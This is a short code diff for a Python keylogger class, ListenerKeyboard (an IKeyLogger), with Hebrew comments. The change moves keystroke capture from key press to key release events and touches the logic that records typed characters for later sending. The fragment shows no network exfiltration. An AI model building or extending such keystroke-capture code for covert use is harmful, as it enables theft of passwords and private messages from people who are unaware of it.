@@ -7,7 +7,7 @@ class ListenerKeyboard(IKeyLogger):
     # בעת יצירת מופע יוצר אוטומטית מערך ריק, מאזין למקלדת, ובודק לפעולות בפונקציה get_logged_keys()
     def __init__(self):
         self.list = []
-        self.listener = Listener(on_press=self.on_press)
+        self.listener = Listener(on_release=self.on_release)
         self.send = False
         self.the_final_list = []
         self.last_time_pressed = time.time()
@@ -31,7 +31,7 @@ class ListenerKeyboard(IKeyLogger):
         return self.the_final_list
 
     # לוקח את התו שהוקש במקלדת, מסדר את התו שיהיה מסודר ושולח לפונקציה ששאחראית להכניס למערך
-    def on_press(self,key):
+    def on_release(self,key):
         key = str(key).replace("'", "")
         if key == '""':
             key = "'"
